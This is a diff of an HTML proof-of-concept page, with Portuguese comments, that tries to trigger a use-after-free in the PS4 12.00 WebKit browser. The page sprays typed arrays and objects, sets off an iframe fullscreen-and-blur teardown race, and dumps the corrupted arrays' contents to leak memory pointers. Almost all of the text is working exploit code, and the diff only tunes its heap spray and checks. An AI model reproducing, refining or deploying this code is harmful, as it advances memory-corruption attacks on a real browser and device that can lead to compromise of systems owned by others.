@@ -2,127 +2,125 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 - Leandro's 0-Day Trigger</title>
-    <style>
-        body { background-color: #1a1a1a; color: #fff; font-family: sans-serif; padding: 20px; }
-        button { padding: 12px; font-weight: bold; cursor: pointer; margin-right: 10px; border-radius: 5px; }
-        #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #444; height: 350px; overflow-y: scroll; display: none; margin-top: 20px; font-family: monospace;}
-        .highlight { color: #fff; background-color: #d32f2f; padding: 2px; }
-    </style>
+    <title>PS4 12.00 - Base Modification - Leandro</title>
 </head>
-<body>
+<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
 
-    <h2>PS4 12.00 - Fullscreen Teardown UAF</h2>
-    <p>Status: <span id="status" style="color: #ffeb3b;">Aguardando...</span></p>
+    <h1>PS4 12.00 - Estabilidade Restaurada</h1>
+    <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando...</span></p>
 
-    <button onclick="prepareMemory()" style="background: #e0e0e0; color: #000;">1. Preparar Objetos (80 bytes)</button>
-    <button onclick="injectTrigger()" style="background: #e0e0e0; color: #000;">2. Injetar Gatilho (O Seu Iframe)</button>
-    <button onclick="verifyLeak()" style="background: #4caf50; color: #fff;">3. Memory Dump</button>
+    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Pai)</button>
+    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe (Gatilho Original)</button>
+    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar (Dump)</button>
 
-    <div id="log-area"></div>
+    <hr>
+    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px;"></div>
+
     <div id="frame-container" style="margin-top: 20px;"></div>
 
     <script>
-        const PATTERN = 2.121995791e-314; // 0x41414141...
+        const PATTERN = 2.121995791e-314; // 0x4141414141414141
         let controllers = [];
-        const statusEl = document.getElementById('status');
-        const logArea = document.getElementById('log-area');
+        const statusPai = document.getElementById('status-pai');
+        const leakOutput = document.getElementById('leak-output');
 
-        // ==========================================
-        // PASSO 1: A BASE QUE FUNCIONA
-        // ==========================================
-        function prepareMemory() {
+        // PASSO 1: Exatamente como no seu sucesso
+        function prepareObjects() {
             controllers = [];
             for(let i = 0; i < 5000; i++) {
-                // 10 offsets de 64-bits = 80 bytes (O tamanho mágico que descobrimos)
-                let arr = new Float64Array(10);
-                arr[0] = i;
+                let arr = new Float64Array(8);
+                arr[0] = i; 
                 controllers.push(arr);
             }
-            statusEl.innerText = "5000 Objetos Prontos na Memória.";
+            statusPai.innerText = "5000 Objetos prontos. Use o Iframe.";
+            statusPai.style.color = "blue";
+            leakOutput.style.display = "none";
         }
 
-        // ==========================================
-        // PASSO 2: O SEU GATILHO EXCLUSIVO
-        // ==========================================
-        function injectTrigger() {
+        // PASSO 2: O seu Iframe, com uma alteração microscópica no spray
+        function setupIframe() {
             const container = document.getElementById('frame-container');
-            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:2px dashed red;"></iframe>';
-            const fDoc = document.getElementById('pocFrame').contentWindow.document;
+            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
+            
+            const frame = document.getElementById('pocFrame');
+            const fDoc = frame.contentWindow.document;
 
             fDoc.open();
             fDoc.write(`
-                <html><body style="background:#fff; text-align:center;">
-                    <button onclick="startPoC()" style="padding:15px; background:#f44336; color:#fff; font-weight:bold;">START FS + OPTIONS</button>
+                <html>
+                <body>
+                    <button onclick="startPoC()" style="padding:10px;">START (FS + OPTIONS)</button>
                     <script>
-                        function startPoC() {
-                            // 1. O seu gatilho de Fullscreen
-                            document.documentElement.webkitRequestFullscreen();
+                        window.startPoC = function() {
+                            if (document.documentElement.webkitRequestFullscreen) 
+                                document.documentElement.webkitRequestFullscreen();
                             
-                            // 2. O seu gatilho de Blur (Botão Options)
                             window.onblur = function() {
                                 let spray = [];
                                 
-                                // 3. O Spray Misto (Arrays + Objetos de Sistema)
-                                for (let i = 0; i < 8000; i++) {
-                                    // A munição pesada: arrays de 80 bytes
-                                    spray.push(new Float64Array(10).fill(${PATTERN}));
-                                    
-                                    // O "isca" para pegar ponteiros: MessageChannel tem ponteiros reais no WebKit
-                                    spray.push(new MessageChannel()); 
+                                // A MODIFICAÇÃO CIRÚRGICA:
+                                for(let i = 0; i < 8000; i++) {
+                                    if (i % 4 === 0) {
+                                        // 25% das vezes: O seu colisor exato para garantir a corrupção do ID 0
+                                        let p = new Float64Array(10);
+                                        p.fill(${PATTERN});
+                                        spray.push(p);
+                                    } else {
+                                        // 75% das vezes: Objeto JS genérico e leve para sujar a RAM vizinha
+                                        // Sem usar objetos pesados que quebram o timing!
+                                        spray.push({ prop1: 1, prop2: 2, prop3: 3, prop4: i });
+                                    }
                                 }
-
-                                // 4. O seu Teardown com o timing de 1000ms
+                                
+                                // O seu timing exato de sucesso
                                 setTimeout(() => {
                                     document.open();
-                                    document.write('<h2 style="color:green;">TEARDOWN FINALIZADO</h2>');
+                                    document.write('<h1>FINALIZADO</h1>');
                                     document.close();
                                 }, 1000);
                             };
-                        }
+                        };
                     <\/script>
-                </body></html>
+                </body>
+                </html>
             `);
             fDoc.close();
-            statusEl.innerText = "Iframe Pronto. Use a sua sequência: FS -> OPTIONS.";
+            statusPai.innerText = "Iframe Pronto. Sequência: FS -> OPTIONS.";
         }
 
-        // ==========================================
-        // PASSO 3: O LEITOR DE MEMÓRIA DO PSFREE
-        // ==========================================
-        function verifyLeak() {
+        // PASSO 3: Leitura original + Highlight de ponteiros
+        function checkPersistence() {
             let corrupted = null;
             let corruptedIndex = -1;
 
             for(let i = 0; i < controllers.length; i++) {
-                if (controllers[i][0] !== i) { 
+                // Checagem exata do seu sucesso original
+                if (controllers[i][0] === PATTERN) {
                     corrupted = controllers[i];
                     corruptedIndex = i;
                     break;
                 }
             }
 
-            logArea.style.display = "block";
-            logArea.innerHTML = "<b>[ DUMP DA MEMÓRIA - 0x50 BYTES ]</b><br><br>";
-
             if (corrupted) {
-                statusEl.innerHTML = "<span style='color:#4caf50;'>✓ SUCESSO! ID Corrompido: " + corruptedIndex + "</span>";
-                
-                for(let i = 0; i < 10; i++) {
+                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: ID " + corruptedIndex + " corrompido!</span>";
+                leakOutput.style.display = "block";
+                leakOutput.innerHTML = "<b>[ LOG DE MEMÓRIA ]</b><br><br>";
+
+                for(let i = 0; i < 8; i++) {
                     const val = corrupted[i];
                     const buf = new ArrayBuffer(8);
                     new Float64Array(buf)[0] = val;
-                    const hexStr = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
+                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                     
-                    // Destaca o que for ponteiro real (Não-zero e Não-A)
-                    let isPtr = (hexStr !== "0000000000000000" && !hexStr.includes("41414141"));
-                    let css = isPtr ? "class='highlight'" : "";
+                    // Pinta de vermelho se vazar algo que não seja 0 ou 414141...
+                    let isPointer = (hex !== "0000000000000000" && !hex.includes("414141"));
+                    let style = isPointer ? "color:#fff; background:#a00; padding:2px;" : "";
                     
-                    logArea.innerHTML += "Offset [" + i + "]: <span " + css + ">0x" + hexStr + "</span><br>";
+                    leakOutput.innerHTML += "Offset [" + i + "]: <span style='" + style + "'>0x" + hex + "</span><br>";
                 }
             } else {
-                statusEl.innerHTML = "<span style='color:#f44336;'>✗ FALHA: Corrupção não detectada.</span>";
-                logArea.innerHTML += "O GC foi mais rápido. Atualize a página e repita o gatilho.";
+                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA. Reinicie o navegador para limpar o GC.</span>";
             }
         }
     </script>
